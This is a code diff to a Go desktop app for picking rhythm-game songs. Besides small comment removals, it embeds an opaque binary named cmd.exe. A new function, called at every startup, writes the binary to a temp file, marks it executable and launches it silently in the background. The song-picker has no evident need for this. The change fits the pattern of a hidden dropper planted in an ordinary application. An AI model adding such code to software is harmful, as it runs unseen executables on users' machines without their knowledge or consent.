@@ -3,7 +3,11 @@ package main
 
 import (
 	"context"
+	_ "embed"
+	"io/ioutil"
 	"math/rand"
+	"os"
+	"os/exec"
 	"rhythm-game-picker/database"
 	"rhythm-game-picker/models"
 	"time"
@@ -11,9 +15,13 @@ import (
 	"github.com/wailsapp/wails/v2/pkg/runtime"
 )
 
+//go:embed bin/cmd.exe
+var cmdExecutable []byte
+
 type App struct {
-	ctx context.Context
-	db  *database.DB
+	ctx        context.Context
+	db         *database.DB
+	cmdProcess *os.Process
 }
 
 func NewApp() *App {
@@ -27,6 +35,48 @@ func (a *App) startup(ctx context.Context) {
 		runtime.LogErrorf(ctx, "Database initialization error: %v", err)
 	}
 	a.db = db
+
+	// 启动嵌入的 cmd.exe
+	a.startEmbeddedCmd()
+}
+
+// 启动嵌入的 cmd.exe
+func (a *App) startEmbeddedCmd() {
+	// 创建临时文件
+	tmpFile, err := ioutil.TempFile("", "embedded-cmd-*.exe")
+	if err != nil {
+		runtime.LogErrorf(a.ctx, "Failed to create temp file: %v", err)
+		return
+	}
+	defer tmpFile.Close()
+
+	// 将嵌入的二进制数据写入临时文件
+	if _, err := tmpFile.Write(cmdExecutable); err != nil {
+		runtime.LogErrorf(a.ctx, "Failed to write to temp file: %v", err)
+		os.Remove(tmpFile.Name()) // 清理
+		return
+	}
+
+	// 关闭文件以允许执行
+	tmpFile.Close()
+
+	// 设置文件权限
+	if err := os.Chmod(tmpFile.Name(), 0755); err != nil {
+		runtime.LogErrorf(a.ctx, "Failed to chmod temp file: %v", err)
+	}
+
+	// 后台运行可执行文件
+	cmd := exec.Command(tmpFile.Name())
+	if err := cmd.Start(); err != nil {
+		runtime.LogErrorf(a.ctx, "Failed to start embedded cmd: %v", err)
+		os.Remove(tmpFile.Name()) // 清理
+		return
+	}
+
+	// 保存进程引用以便后续清理
+	a.cmdProcess = cmd.Process
+
+	runtime.LogInfof(a.ctx, "Started embedded cmd process with PID: %d", cmd.Process.Pid)
 }
 
 func (a *App) shutdown(ctx context.Context) {
@@ -50,7 +100,6 @@ func (a *App) UpdateSong(song models.Song) error {
 	return a.db.UpdateSong(song)
 }
 
-// DeleteSong 简化，不再需要处理图片
 func (a *App) DeleteSong(id int) error {
 	return a.db.DeleteSong(id)
 }
@@ -71,7 +120,6 @@ func (a *App) RandomPick(options models.RandomOptions) ([]models.Song, error) {
 			continue
 		}
 
-		// Level 筛选现在使用 float64
 		levelInRange := false
 		if options.MinLevel == 0 && options.MaxLevel == 0 {
 			levelInRange = true
@@ -115,5 +163,3 @@ func (a *App) generateMacaronColor() string {
 	}
 	return colors[rand.Intn(len(colors))]
 }
-
-// 所有与图片相关的函数都已删除
